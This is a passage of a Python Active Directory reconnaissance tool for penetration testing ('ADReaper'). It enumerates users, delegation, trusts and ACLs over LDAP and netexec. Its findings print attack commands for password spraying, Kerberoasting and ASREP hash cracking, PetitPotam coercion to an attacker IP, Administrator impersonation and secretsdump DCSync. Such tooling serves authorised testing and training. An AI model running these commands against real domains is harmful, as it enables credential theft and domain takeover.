#!/usr/bin/env python3
"""
ADReaper — Active Directory & Windows Privilege Escalation Recon Tool
OSCP-compliant: enumeration only, no exploitation.
"""

import argparse, json, os, re, socket, subprocess, sys, threading, time
from datetime import datetime, timezone

# ── dependency check ──────────────────────────────────────────────────────────
def check_deps():
    missing = []
    for pkg in ["ldap3", "rich"]:
        try:
            __import__(pkg)
        except ImportError:
            missing.append(pkg)
    if missing:
        print(f"[!] Missing: {', '.join(missing)}")
        print(f"    pip3 install {' '.join(missing)} --break-system-packages")
        sys.exit(1)

check_deps()

from ldap3 import Server, Connection, ALL, NTLM, ANONYMOUS
from ldap3.core.exceptions import LDAPException
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich import box as richbox

console = Console()

# ── severity helpers ───────────────────────────────────────────────────────────
SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
SEV_STYLE = {"CRITICAL": "bold red", "HIGH": "bold yellow",
             "MEDIUM": "cyan", "LOW": "dim", "INFO": "green"}
SEV_BADGE = {
    "CRITICAL": "🔴 CRITICAL",
    "HIGH":     "🟠 HIGH    ",
    "MEDIUM":   "🟡 MEDIUM  ",
    "LOW":      "⚪ LOW     ",
    "INFO":     "🔵 INFO    ",
}

# ── global results ─────────────────────────────────────────────────────────────
results = {
    "meta": {}, "domain": {},
    "users": [], "computers": [], "groups": [],
    "spn_users": [], "asrep_users": [],
    "unconstrained_users": [], "unconstrained_computers": [],
    "constrained": [], "trusts": [], "gpos": [],
    "password_in_desc": [], "stale_computers": [],
    "smb_shares": [], "logged_on_users": [],
    "nxc_output": {},   # raw nxc section outputs
    "findings": [],
    "privesc_checks": {},
}
results_lock = threading.Lock()

def add_finding(severity, title, detail, commands=None, raw_output=""):
    with results_lock:
        results["findings"].append({
            "severity": severity, "title": title,
            "detail": detail, "commands": commands or [],
            "raw_output": raw_output,
        })

# ═════════════════════════════════════════════════════════════════════════════
# HELPERS
# ═════════════════════════════════════════════════════════════════════════════

def run_cmd(cmd, timeout=45):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=timeout)
        return p.stdout.strip(), p.stderr.strip(), p.returncode
    except subprocess.TimeoutExpired:
        return "", f"TIMEOUT after {timeout}s", -1
    except Exception as e:
        return "", str(e), -1

def tool_ok(name):
    out, _, rc = run_cmd(f"which {name}")
    return rc == 0 and bool(out)

def nxc_bin():
    for b in ("nxc", "netexec", "crackmapexec"):
        if tool_ok(b):
            return b
    return None

def strip_ansi(s):
    return re.sub(r'\x1b\[[0-9;]*m', '', s)

def safe_print(line):
    """Print a line from external tool output without Rich markup crashes."""
    console.print(line, markup=False, highlight=False)

def section(title):
    console.rule(f"[bold cyan]{title}[/bold cyan]")

# ═════════════════════════════════════════════════════════════════════════════
# BANNER — DRAGON
# ═════════════════════════════════════════════════════════════════════════════

DRAGON = r"""
         \||/     __----~~~~~~~~~~------___
          ||    -~                          ~~-_
    >:==<||  /_   o O o  ADReaper  o O o      \
          || /    ~~---,________,---~~          }
         \||/          |        |              /}
          '     <=====>|   /\   |<=====>     //
                _/|   _|  /  \  |_   |\_    //
               / ||  (_)-/    \-(_)  || \  //
              /  || /            \   ||  \/
             /  / \/  /\      /\  \  / \  )
            /  /  /  /  \    /  \  \/   \/
           (  /  /  / )) \  / (( \  \   /
            \/  (  / //\\ \/  //\\ \  \/
             \   \/  \\//  /  \\//  \/
              \   /   \/  /    \/   /
  ~.~.~.~.~.~.\_/~.~.\/~.~.~.\/~./~.~.~.~.~.~
  ~.~.~.~ FIRE & FURY ~ ENUMERATE ~ DOMINATE ~.~"""

# HTML inline SVG dragon for the report hero
DRAGON_SVG = """<svg viewBox="0 0 680 300" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:680px;display:block;margin:0 auto;">
  <style>
    .dr1{fill:#cc2200}.dr2{fill:#ff4422}.dr3{fill:#ff6644}
    .fl1{fill:#ff8800}.fl2{fill:#ffaa00}.fl3{fill:#ffdd00}
  </style>
  <!-- fire breath -->
  <polygon points="28,148 0,128 20,147 0,154 24,150 0,170 28,156" class="fl3" opacity=".9"/>
  <polygon points="40,144 8,118 30,143 6,147 32,146 4,162 38,152" class="fl2" opacity=".8"/>
  <polygon points="54,140 22,112 46,139 18,143 44,142 16,156 50,149" class="fl1" opacity=".75"/>
  <polygon points="66,137 32,110 58,136 26,140 56,139 24,153 62,146" class="dr3" opacity=".6"/>
  <!-- tail -->
  <path d="M575,195 Q618,206 648,190 Q660,185 655,197 Q638,218 608,213 Q592,210 575,195Z" class="dr1"/>
  <path d="M572,202 Q592,224 618,229 Q638,240 632,252 Q612,246 592,231 Q572,217 572,202Z" class="dr2"/>
  <polygon points="646,188 668,178 661,196 674,190 658,204 648,193" class="dr3"/>
  <!-- body -->
  <path d="M88,108 Q140,76 202,92 Q252,106 282,98 Q322,86 362,98 Q402,110 442,103 Q482,93 522,108 Q552,118 576,146 Q582,160 576,173 Q560,192 530,186 Q498,178 478,170 Q438,158 398,162 Q358,168 318,160 Q278,152 238,160 Q198,168 162,158 Q128,148 106,148 Q82,148 78,156 Q70,166 74,176 Q68,168 66,158 Q62,138 74,124 Q80,113 88,108Z" class="dr1"/>
  <path d="M118,148 Q160,133 222,137 Q282,141 342,137 Q402,133 462,139 Q512,144 546,155 Q557,160 552,168 Q536,179 510,176 Q470,170 428,165 Q380,162 320,165 Q260,168 200,162 Q154,158 128,155 Q110,152 113,148Z" class="dr2" opacity=".45"/>
  <!-- neck -->
  <path d="M106,148 Q90,136 78,126 Q70,116 74,106 Q80,93 94,90 Q108,88 118,98 Q128,108 125,124 Q120,136 106,148Z" class="dr1"/>
  <!-- head -->
  <path d="M53,116 Q63,93 83,86 Q98,80 114,86 Q128,93 132,108 Q136,122 128,136 Q118,150 104,152 Q86,154 70,142 Q53,130 53,116Z" class="dr1"/>
  <path d="M53,116 Q62,102 78,96 Q92,91 108,95 Q121,100 124,114 Q126,124 117,132 Q106,140 92,139 Q76,138 64,127 Q55,118 53,116Z" class="dr2" opacity=".65"/>
  <!-- snout -->
  <path d="M40,134 Q48,120 62,116 Q72,113 78,120 Q84,128 78,138 Q70,150 58,150 Q46,147 40,134Z" class="dr1"/>
  <path d="M40,134 Q48,124 60,122 Q69,120 73,128 Q76,136 67,143 Q58,148 50,144 Q42,139 40,134Z" class="dr3" opacity=".5"/>
  <!-- jaw -->
  <path d="M40,137 Q52,150 68,153 Q82,157 90,150 Q97,144 91,136 Q80,140 66,140 Q53,140 40,137Z" class="dr1"/>
  <!-- eye -->
  <ellipse cx="70" cy="110" rx="8" ry="6" fill="#ff6600"/>
  <ellipse cx="70" cy="110" rx="5" ry="4" fill="#1a0000"/>
  <ellipse cx="68" cy="109" rx="2" ry="1.5" fill="#ff9900" opacity=".85"/>
  <path d="M62,105 Q70,102 78,106" fill="none" stroke="#991100" stroke-width="2.5" stroke-linecap="round"/>
  <!-- nostril -->
  <ellipse cx="46" cy="127" rx="2.5" ry="2" fill="#330000"/>
  <!-- horns -->
  <polygon points="80,86 70,54 90,80" class="dr3"/>
  <polygon points="80,86 68,56 76,86" class="dr2" opacity=".55"/>
  <polygon points="94,82 88,48 104,78" class="dr3"/>
  <polygon points="94,82 87,50 95,82" class="dr2" opacity=".55"/>
  <ellipse cx="70" cy="55" rx="3" ry="4" fill="#ff4422" opacity=".7"/>
  <ellipse cx="88" cy="49" rx="3" ry="4" fill="#ff4422" opacity=".7"/>
  <!-- back spines -->
  <polygon points="150,96 144,64 160,93" class="dr3"/>
  <polygon points="188,88 182,56 198,86" class="dr3"/>
  <polygon points="228,83 224,52 238,81" class="dr3"/>
  <polygon points="270,86 267,54 280,84" class="dr3"/>
  <polygon points="314,86 312,54 324,85" class="dr3"/>
  <polygon points="358,90 356,58 368,88" class="dr3"/>
  <polygon points="400,96 399,64 411,94" class="dr3"/>
  <polygon points="442,102 442,70 454,100" class="dr3"/>
  <polygon points="482,107 484,76 494,106" class="dr3"/>
  <polygon points="520,114 523,83 532,113" class="dr3"/>
  <!-- front leg L -->
  <path d="M153,158 Q146,176 144,200 Q141,220 150,230 Q158,240 166,230 Q174,220 170,200 Q166,178 162,161Z" class="dr1"/>
  <path d="M150,230 Q144,242 137,247 L148,250 Q158,252 168,250 L176,247 Q168,242 166,230Z" class="dr1"/>
  <polygon points="137,247 128,261 141,254" class="dr3"/>
  <polygon points="148,250 144,264 154,257" class="dr3"/>
  <polygon points="158,252 158,266 165,258" class="dr3"/>
  <polygon points="168,250 172,264 175,255" class="dr3"/>
  <!-- front leg R -->
  <path d="M357,161 Q349,178 347,202 Q344,222 352,232 Q360,242 368,232 Q376,222 372,202 Q368,182 364,164Z" class="dr1"/>
  <path d="M352,232 Q346,244 339,249 L350,252 Q360,255 370,252 L378,249 Q370,244 368,232Z" class="dr1"/>
  <polygon points="339,249 330,263 343,256" class="dr3"/>
  <polygon points="350,252 346,267 356,259" class="dr3"/>
  <polygon points="360,254 360,269 367,261" class="dr3"/>
  <polygon points="370,252 374,267 377,257" class="dr3"/>
  <!-- back leg -->
  <path d="M497,171 Q491,188 490,211 Q488,231 496,241 Q504,252 512,241 Q520,231 517,211 Q514,191 509,174Z" class="dr1"/>
  <path d="M496,241 Q490,253 483,258 L494,261 L514,261 L521,258 Q514,253 512,241Z" class="dr1"/>
  <polygon points="483,258 474,271 487,265" class="dr3"/>
  <polygon points="494,261 490,275 500,268" class="dr3"/>
  <polygon points="504,263 505,277 511,269" class="dr3"/>
  <polygon points="514,261 518,275 520,266" class="dr3"/>
  <!-- wing L -->
  <path d="M202,106 Q176,74 146,44 Q120,20 92,16 Q103,34 114,54 Q98,40 80,36 Q95,57 110,70 Q88,60 65,60 Q83,80 102,88 Q86,84 70,85 Q89,95 112,100Z" class="dr1" opacity=".82"/>
  <path d="M202,106 Q164,83 140,50" fill="none" stroke="#ff4422" stroke-width="1" opacity=".45"/>
  <path d="M202,106 Q155,90 116,72" fill="none" stroke="#ff4422" stroke-width="1" opacity=".35"/>
  <path d="M202,106 Q158,97 108,100" fill="none" stroke="#ff4422" stroke-width="1" opacity=".35"/>
  <path d="M146,44 Q120,20 92,16 Q103,34 114,54" fill="none" stroke="#ff6644" stroke-width="1.5" stroke-linecap="round" opacity=".65"/>
  <!-- wing R -->
  <path d="M432,106 Q472,70 512,40 Q542,16 578,10 Q567,28 553,50 Q570,36 590,30 Q574,52 558,66 Q580,56 602,54 Q582,75 563,84 Q580,79 600,78 Q580,92 558,98Z" class="dr1" opacity=".82"/>
  <path d="M432,106 Q470,80 512,44" fill="none" stroke="#ff4422" stroke-width="1" opacity=".45"/>
  <path d="M432,106 Q474,88 560,66" fill="none" stroke="#ff4422" stroke-width="1" opacity=".35"/>
  <path d="M432,106 Q470,97 560,98" fill="none" stroke="#ff4422" stroke-width="1" opacity=".35"/>
  <path d="M512,40 Q542,16 578,10 Q567,28 553,50" fill="none" stroke="#ff6644" stroke-width="1.5" stroke-linecap="round" opacity=".65"/>
  <!-- title -->
  <text x="340" y="284" text-anchor="middle" font-family="'Courier New',monospace" font-size="28" font-weight="700" letter-spacing="14" fill="#cc2200">ADReaper</text>
  <text x="340" y="303" text-anchor="middle" font-family="'Courier New',monospace" font-size="11" letter-spacing="2" fill="#882200" opacity=".75">Active Directory · Windows PrivEsc · OSCP Recon</text>
</svg>"""


def print_banner(args):
    console.print(f"[bold red]{DRAGON}[/bold red]")
    info = Text()
    info.append(f"\n  DC      : ", style="dim")
    info.append(args.dc_ip, style="bold cyan")
    info.append(f"\n  Domain  : ", style="dim")
    info.append(args.domain, style="bold cyan")
    info.append(f"\n  User    : ", style="dim")
    info.append(args.user or "anonymous", style="bold cyan")
    info.append(f"\n  Started : ", style="dim")
    info.append(datetime.now().strftime("%Y-%m-%d %H:%M:%S"), style="dim")
    info.append("\n")
    console.print(Panel(info, title="[bold red]  A D R e a p e r  [/bold red]",
                        border_style="red", padding=(0, 2)))

# ═════════════════════════════════════════════════════════════════════════════
# LDAP CONNECTION
# ═════════════════════════════════════════════════════════════════════════════

def get_ldap_connection(args):
    server = Server(args.dc_ip, get_info=ALL, connect_timeout=10)
    try:
        if args.password:
            conn = Connection(server,
                user=f"{args.domain}\\{args.user}",
                password=args.password, authentication=NTLM, auto_bind=True)
        elif args.hash:
            nt = args.hash.split(":")[-1]
            conn = Connection(server,
                user=f"{args.domain}\\{args.user}",
                password=f"aad3b435b51404eeaad3b435b51404ee:{nt}",
                authentication=NTLM, auto_bind=True)
        else:
            conn = Connection(server, authentication=ANONYMOUS, auto_bind=True)
        return conn
    except LDAPException as e:
        console.print(f"[red][!] LDAP failed: {e}[/red]")
        return None

def get_base_dn(domain):
    return ",".join(f"DC={p}" for p in domain.split("."))

# ═════════════════════════════════════════════════════════════════════════════
# MODULE 1 — DOMAIN BASELINE (LDAP)
# ═════════════════════════════════════════════════════════════════════════════

def module_domain_info(conn, base_dn, args):
    console.print("[cyan]  → Domain baseline (LDAP)...[/cyan]")
    try:
        conn.search(base_dn, "(objectClass=domain)", attributes=[
            "name", "distinguishedName", "minPwdLength", "pwdHistoryLength",
            "lockoutThreshold", "maxPwdAge", "ms-DS-MachineAccountQuota",
        ])
        if conn.entries:
            e = conn.entries[0]
            def a(n):
                try: v = getattr(e, n).value; return v if v is not None else "N/A"
                except: return "N/A"
            info = {
                "name": a("name"), "dn": a("distinguishedName"),
                "min_pwd_length": a("minPwdLength"),
                "pwd_history": a("pwdHistoryLength"),
                "lockout_threshold": a("lockoutThreshold"),
                "max_pwd_age": a("maxPwdAge"),
                "machine_account_quota": a("ms-DS-MachineAccountQuota"),
            }
            with results_lock: results["domain"] = info

            try: thresh = int(str(a("lockoutThreshold")))
            except: thresh = 999
            try: min_len = int(str(a("minPwdLength")))
            except: min_len = 8
            try: maq = int(str(a("ms-DS-MachineAccountQuota")))
            except: maq = 10

            if thresh == 0:
                add_finding("HIGH", "No account lockout policy",
                    "Lockout = 0 — safe to spray without risk of locking accounts.",
                    [f"nxc smb {args.dc_ip} -u users.txt -p passwords.txt --continue-on-success",
                     f"kerbrute passwordspray users.txt <PASS> --dc {args.dc_ip} -d {args.domain}"])
            if min_len < 8:
                add_finding("MEDIUM", f"Weak minimum password length ({min_len})",
                    "Short passwords crack faster.", ["hashcat -m 13100 hashes.txt rockyou.txt"])
            if maq > 0:
                add_finding("MEDIUM", f"Machine Account Quota = {maq}",
                    "Any user can add machines — enables RBCD attacks.",
                    [f"addcomputer.py -computer-name 'EVIL$' -computer-pass 'Evil123!' "
                     f"-dc-ip {args.dc_ip} {args.domain}/{args.user}"])

        conn.search(base_dn, "(userAccountControl:1.2.840.113556.1.4.803:=8192)",
                    attributes=["dNSHostName", "operatingSystem"])
        dcs = [{"hostname": str(getattr(e,"dNSHostName","?")),
                "os": str(getattr(e,"operatingSystem","?"))} for e in conn.entries]
        with results_lock: results["domain"]["domain_controllers"] = dcs

    except Exception as ex:
        console.print(f"[red]  [!] Domain baseline error: {ex}[/red]")

# ═════════════════════════════════════════════════════════════════════════════
# MODULE 2 — USER ENUMERATION (LDAP)
# ═════════════════════════════════════════════════════════════════════════════

def module_users(conn, base_dn, args):
    console.print("[cyan]  → User enumeration (LDAP)...[/cyan]")
    try:
        conn.search(base_dn, "(&(objectCategory=person)(objectClass=user))",
            attributes=["sAMAccountName","userAccountControl","adminCount",
                        "pwdLastSet","description","servicePrincipalName",
                        "lastLogonTimestamp","memberOf"])
        UAC_DISABLED   = 2
        UAC_NOPREAUTH  = 4194304
        UAC_PASSNOTREQD = 32

        spn_users, asrep_users, desc_users = [], [], []
        for e in conn.entries:
            sam = str(getattr(e,"sAMAccountName","?"))
            try: uac = int(getattr(e,"userAccountControl",0).value or 0)
            except: uac = 0
            admin = getattr(e,"adminCount",None)
            admin = int(admin.value) if admin and admin.value else 0
            desc  = str(getattr(e,"description",""))
            spns  = getattr(e,"servicePrincipalName",None)
            spns  = spns.values if spns else []
            pwd   = getattr(e,"pwdLastSet",None)

            rec = {"name": sam, "uac": uac, "admin": admin, "description": desc,
                   "spns": [str(s) for s in spns],
                   "pwd_last_set": str(pwd.value) if pwd and pwd.value else "Never"}
            with results_lock: results["users"].append(rec)

            if uac & UAC_NOPREAUTH and not (uac & UAC_DISABLED):
                with results_lock: results["asrep_users"].append(sam)
                asrep_users.append(sam)

            if spns and not sam.endswith("$") and not (uac & UAC_DISABLED):
                with results_lock: results["spn_users"].append({"name":sam,"spns":[str(s) for s in spns]})
                spn_users.append(sam)

            desc_l = desc.lower()
            if desc and desc != "None" and any(k in desc_l for k in [
                "pass","pwd","cred","secret","key","p@ss","login","temp","default","welcome","admin","changeme"
            ]):
                with results_lock: results["password_in_desc"].append({"user":sam,"description":desc})
                desc_users.append(sam)

            if uac & UAC_PASSNOTREQD and not (uac & UAC_DISABLED):
                add_finding("MEDIUM", f"PASSWD_NOTREQD on {sam}",
                    "Blank password may be set.",
                    [f"nxc smb {args.dc_ip} -u '{sam}' -p '' -d {args.domain}"])

        if asrep_users:
            add_finding("HIGH", f"ASREPRoastable accounts ({len(asrep_users)})",
                f"Accounts: {', '.join(asrep_users)}",
                [f"nxc ldap {args.dc_ip} -u '{args.user or ''}' -p '' --asreproast /tmp/asrep_hashes.txt",
                 f"GetNPUsers.py {args.domain}/{args.user or ''} -dc-ip {args.dc_ip} -no-pass -format hashcat -outputfile /tmp/asrep_hashes.txt",
                 f"hashcat -m 18200 /tmp/asrep_hashes.txt /usr/share/wordlists/rockyou.txt"])

        if spn_users:
            detail = "\n".join(f"  {u['name']}: {', '.join(u['spns'])}" for u in results["spn_users"])
            add_finding("HIGH", f"Kerberoastable accounts ({len(spn_users)})",
                f"Accounts:\n{detail}",
                [f"nxc ldap {args.dc_ip} -u '{args.user}' -p '{args.password or '<PASS>'}' --kerberoasting /tmp/kerb_hashes.txt",
                 f"GetUserSPNs.py {args.domain}/{args.user}:{args.password or '<PASS>'} -dc-ip {args.dc_ip} -request -outputfile /tmp/kerb_hashes.txt",
                 f"hashcat -m 13100 /tmp/kerb_hashes.txt /usr/share/wordlists/rockyou.txt"])

        if desc_users:
            for u in results["password_in_desc"]:
                add_finding("CRITICAL", f"Credential in description: {u['user']}",
                    f"Description: {u['description']}", [])

    except Exception as ex:
        console.print(f"[red]  [!] User enum error: {ex}[/red]")

# ═════════════════════════════════════════════════════════════════════════════
# MODULE 3 — COMPUTERS (LDAP)
# ═════════════════════════════════════════════════════════════════════════════

def module_computers(conn, base_dn, args):
    console.print("[cyan]  → Computer enumeration (LDAP)...[/cyan]")
    try:
        conn.search(base_dn, "(objectClass=computer)", attributes=[
            "dNSHostName","operatingSystem","operatingSystemVersion",
            "lastLogonTimestamp","userAccountControl","whenCreated"])
        UAC_UNCONSTRAINED = 524288
        UAC_DISABLED = 2
        now = datetime.now(timezone.utc)
        for e in conn.entries:
            hostname = str(getattr(e,"dNSHostName","unknown"))
            os_name  = str(getattr(e,"operatingSystem","unknown"))
            try: uac = int(getattr(e,"userAccountControl",0).value or 0)
            except: uac = 0
            llt = getattr(e,"lastLogonTimestamp",None)
            days = None
            try:
                v = llt.value
                if v and hasattr(v,"timestamp"):
                    days = (now - v.replace(tzinfo=timezone.utc)).days
            except: pass
            stale = days is not None and days > 90
            rec = {"hostname":hostname,"os":os_name,"uac":uac,"stale":stale,"days_since_logon":days}
            with results_lock: results["computers"].append(rec)
            if stale:
                with results_lock: results["stale_computers"].append(hostname)
                add_finding("MEDIUM", f"Stale computer: {hostname}",
                    f"Last logon: {days} days ago. OS: {os_name}",
                    [f"nmap -sV --script smb-vuln* -p 445 {hostname}"])
            if uac & UAC_UNCONSTRAINED and "dc" not in hostname.lower():
                with results_lock: results["unconstrained_computers"].append(hostname)
                add_finding("HIGH", f"Unconstrained delegation: {hostname}",
                    "Coerce DC auth → capture TGT → DCSync",
                    [f"PetitPotam.py -u '{args.user}' -p '{args.password or '<PASS>'}' <ATTACKER_IP> {hostname}",
                     f"Rubeus.exe monitor /interval:5 /nowrap"])
            if any(x in os_name for x in ["Windows 7","Windows XP","2003","Vista","2008"]):
                add_finding("HIGH", f"Legacy OS: {hostname}",
                    f"{os_name} — EternalBlue candidate",
                    [f"nmap -sV --script smb-vuln-ms17-010 -p 445 {hostname}"])
    except Exception as ex:
        console.print(f"[red]  [!] Computer enum error: {ex}[/red]")

# ═════════════════════════════════════════════════════════════════════════════
# MODULE 4 — GROUPS (LDAP)
# ═════════════════════════════════════════════════════════════════════════════

def module_groups(conn, base_dn, args):
    console.print("[cyan]  → Group enumeration (LDAP)...[/cyan]")
    try:
        conn.search(base_dn, "(objectClass=group)",
            attributes=["sAMAccountName","adminCount","member","managedBy"])
        PRIV = ["Domain Admins","Enterprise Admins","Schema Admins","Backup Operators",
                "Account Operators","Print Operators","Server Operators","DNS Admins",
                "Remote Management Users","Hyper-V Administrators","DnsAdmins"]
        for e in conn.entries:
            name = str(getattr(e,"sAMAccountName",""))
            members_raw = getattr(e,"member",None)
            members = members_raw.values if members_raw else []
            rec = {"name":name,"member_count":len(members)}
            with results_lock: results["groups"].append(rec)
            if name in PRIV and members:
                names = [m.split(",")[0].replace("CN=","") for m in members]
                add_finding("INFO", f"Privileged group: {name}",
                    f"Members: {', '.join(names[:15])}",
                    [f"net group '{name}' /domain"])
    except Exception as ex:
        console.print(f"[red]  [!] Group enum error: {ex}[/red]")

# ═════════════════════════════════════════════════════════════════════════════
# MODULE 5 — DELEGATION (LDAP)
# ═════════════════════════════════════════════════════════════════════════════

def module_delegation(conn, base_dn, args):
    console.print("[cyan]  → Delegation (LDAP)...[/cyan]")
    try:
        conn.search(base_dn, "(&(objectCategory=person)(objectClass=user)(msDS-AllowedToDelegateTo=*))",
            attributes=["sAMAccountName","msDS-AllowedToDelegateTo"])
        for e in conn.entries:
            sam = str(e.sAMAccountName)
            t = getattr(e,"msDS-AllowedToDelegateTo",None)
            targets = t.values if t else []
            with results_lock: results["constrained"].append({"name":sam,"targets":[str(x) for x in targets]})
            add_finding("HIGH", f"Constrained delegation user: {sam}",
                f"Can impersonate to: {', '.join(str(x) for x in targets)}",
                [f"getST.py -spn '{targets[0] if targets else '<SPN>'}' -impersonate Administrator "
                 f"-dc-ip {args.dc_ip} {args.domain}/{sam}"])
        conn.search(base_dn, "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))",
            attributes=["dNSHostName","msDS-AllowedToDelegateTo"])
        for e in conn.entries:
            hn = str(getattr(e,"dNSHostName","?"))
            t = getattr(e,"msDS-AllowedToDelegateTo",None)
            targets = t.values if t else []
            add_finding("HIGH", f"Constrained delegation computer: {hn}",
                f"Targets: {', '.join(str(x) for x in targets)}", [])
    except Exception as ex:
        console.print(f"[red]  [!] Delegation error: {ex}[/red]")

# ═════════════════════════════════════════════════════════════════════════════
# MODULE 6 — TRUSTS + GPOS (LDAP)
# ═════════════════════════════════════════════════════════════════════════════

def module_trusts(conn, base_dn, args):
    console.print("[cyan]  → Trusts & GPOs (LDAP)...[/cyan]")
    try:
        conn.search(base_dn, "(objectClass=trustedDomain)",
            attributes=["name","trustDirection","trustAttributes"])
        DIRS = {0:"Disabled",1:"Inbound",2:"Outbound",3:"Bidirectional"}
        for e in conn.entries:
            name = str(getattr(e,"name","?"))
            d = int(getattr(e,"trustDirection",0).value or 0)
            direction = DIRS.get(d,"Unknown")
            ta = int(getattr(e,"trustAttributes",0).value or 0)
            transitive = not (ta & 0x4)
            with results_lock: results["trusts"].append({"domain":name,"direction":direction,"transitive":transitive})
            if direction in ["Outbound","Bidirectional"]:
                add_finding("MEDIUM", f"Domain trust: {name} ({direction})",
                    f"{'Transitive' if transitive else 'Non-transitive'} — cross-domain paths possible",
                    [f"Get-DomainUser -SPN -Domain {name}",
                     f"Get-DomainForeignGroupMember -Domain {name}"])
    except Exception as ex:
        console.print(f"[red]  [!] Trust error: {ex}[/red]")

    try:
        conn.search(base_dn, "(objectClass=groupPolicyContainer)",
            attributes=["displayName","gPCFileSysPath"])
        gpos = []
        for e in conn.entries:
            n = str(getattr(e,"displayName","?"))
            p = str(getattr(e,"gPCFileSysPath",""))
            gpos.append({"name":n,"path":p})
        with results_lock: results["gpos"] = gpos
        if gpos:
            detail = "\n".join(f"  {g['name']}  →  {g['path']}" for g in gpos)
            add_finding("INFO", f"GPOs found ({len(gpos)})",
                f"Check for writable GPOs:\n{detail}",
                [f"$sid=(Get-DomainGroup 'Domain Users').objectsid",
                 f"Get-DomainGPO | Get-ObjectAcl | ?{{$_.SecurityIdentifier -eq $sid}}",
                 f"Group3r.exe -f group3r_out.log"])
    except Exception as ex:
        console.print(f"[red]  [!] GPO error: {ex}[/red]")

# ═════════════════════════════════════════════════════════════════════════════
# MODULE 7 — ACL / DCSYNC (LDAP + dacledit)
# ═════════════════════════════════════════════════════════════════════════════

def module_acls(conn, base_dn, args):
    console.print("[cyan]  → ACL / DCSync check (LDAP)...[/cyan]")
    try:
        conn.search(base_dn, "(&(objectCategory=person)(objectClass=user)(adminCount=1))",
            attributes=["sAMAccountName"])
        admin_users = [str(e.sAMAccountName) for e in conn.entries]
        add_finding("INFO", f"AdminCount=1 accounts ({len(admin_users)})",
            f"Protected by AdminSDHolder: {', '.join(admin_users)}",
            [f"dacledit.py -action read -target-dn '{base_dn}' "
             f"{args.domain}/{args.user}:{args.password or '<PASS>'} -dc-ip {args.dc_ip}"])

        if args.password and tool_ok("dacledit.py"):
            console.print(f"  [yellow]  → dacledit.py DCSync check...[/yellow]")
            cmd = (f"dacledit.py -action read -target-dn '{base_dn}' "
                   f"{args.domain}/{args.user}:{args.password} -dc-ip {args.dc_ip} 2>/dev/null")
            out, _, rc = run_cmd(cmd, timeout=30)
            if out:
                hits = [l for l in out.splitlines()
                        if any(x in l for x in ["Replication","GenericAll","WriteDacl","DCSync"])]
                if hits:
                    add_finding("CRITICAL", "DCSync-capable ACEs found",
                        "\n".join(hits[:15]),
                        [f"secretsdump.py {args.domain}/{args.user}:{args.password}@{args.dc_ip}"],
                        raw_output="\n".join(hits[:15]))

        add_finding("INFO", "DACL — BloodHound for full picture",
            "Run BloodHound for complete ACL attack path analysis.",
            [f"nxc ldap {args.dc_ip} -u '{args.user}' -p '{args.password or '<PASS>'}' "
             f"--bloodhound --collection All --dns-server {args.dc_ip}",
             f"bloodhound-python -u '{args.user}' -p '{args.password or '<PASS>'}' "
             f"-d {args.domain} -dc {args.dc_ip} --zip -c All"])
    except Exception as ex:
        console.print(f"[red]  [!] ACL error: {ex}[/red]")

# ═════════════════════════════════════════════════════════════════════════════
# MODULE 8 — NXC LIVE EXECUTION (the core new module)
# ═════════════════════════════════════════════════════════════════════════════

def run_nxc_cmd(label, cmd, timeout=40, filter_plus=False):
    """Run an nxc command, print output live, store result, return lines."""
    console.print(f"  [bold yellow]  ▶ {label}[/bold yellow]")
    console.print(f"  [dim]  $ {cmd}[/dim]")
    out, err, rc = run_cmd(cmd, timeout=timeout)
    lines = strip_ansi(out).splitlines()
    if filter_plus:
        lines = [l for l in lines if "[+]" in l or "+" in l]
    for l in lines[:40]:
        safe_print(f"    {l}")
    if not lines:
        console.print("    [dim](no output)[/dim]")
    with results_lock:
        results["nxc_output"][label] = "\n".join(lines)
    console.print()
    return lines

def module_nxc(args):
    nxc = nxc_bin()
    if not nxc:
        console.print("[red]  [!] netexec/nxc/crackmapexec not found — skipping live NXC module[/red]")
        add_finding("INFO", "NXC tool not found",
            "Install netexec: pip3 install netexec --break-system-packages", [])
        return

    u      = args.user or ""
    p      = args.password or ""
    d      = args.domain
    dc     = args.dc_ip          # ← always the DC — LDAP/Kerberos/AD queries
    host   = args.target or args.dc_ip  # ← the machine being attacked — SMB/WinRM/RDP
    lhost  = args.lhost or "<LHOST>"
    outdir = args.output

    host_is_dc = (host == dc)

    console.print(f"\n  [bold cyan]DC (AD queries)   :[/bold cyan] [white]{dc}[/white]")
    console.print(f"  [bold cyan]Target (host ops) :[/bold cyan] [white]{host}[/white]", end="")
    if host_is_dc:
        console.print("  [dim](same as DC)[/dim]")
    else:
        console.print()
    console.print()

    # ══════════════════════════════════════════════════════════════════════
    # PART A — AD/LDAP COMMANDS  →  always against DC
    # These need a DC to work. Running them against a workstation = silence.
    # ══════════════════════════════════════════════════════════════════════
    section("NXC — AD / LDAP / KERBEROS  (target: DC)")

    # 1. LDAP user list
    run_nxc_cmd("LDAP user list",
        f"{nxc} ldap {dc} -u '{u}' -p '{p}' --users 2>/dev/null")

    # 2. SMB users export → write users.txt
    users_file = os.path.join(outdir, "users.txt")
    run_nxc_cmd("SMB users export",
        f"{nxc} smb {dc} -u '{u}' -p '{p}' --users 2>/dev/null")
    raw = results["nxc_output"].get("SMB users export","")
    unames = []
    for l in raw.splitlines():
        m = re.search(r'\s+(\w[\w\.\-]+)\s+.*(?:badpwdcount|Password)', l, re.I)
        if m: unames.append(m.group(1))
    if unames:
        with open(users_file, "w") as f: f.write("\n".join(unames))
        console.print(f"  [green]  → {len(unames)} usernames saved to {users_file}[/green]")

    # 3. Active users only
    run_nxc_cmd("LDAP active users",
        f"{nxc} ldap {dc} -u '{u}' -p '{p}' --active-users 2>/dev/null")

    # 4. Admin accounts
    lines = run_nxc_cmd("LDAP admin accounts",
        f"{nxc} ldap {dc} -u '{u}' -p '{p}' --admin-count 2>/dev/null")
    hits = [l for l in lines if "admin" in l.lower()]
    if hits:
        add_finding("INFO", "AdminCount accounts (NXC)", "\n".join(hits[:20]), [])

    # 5. User descriptions — cred hunting
    lines = run_nxc_cmd("User descriptions",
        f"{nxc} ldap {dc} -u '{u}' -p '{p}' -M user-desc 2>/dev/null")
    desc_hits = [l for l in lines if any(k in l.lower() for k in
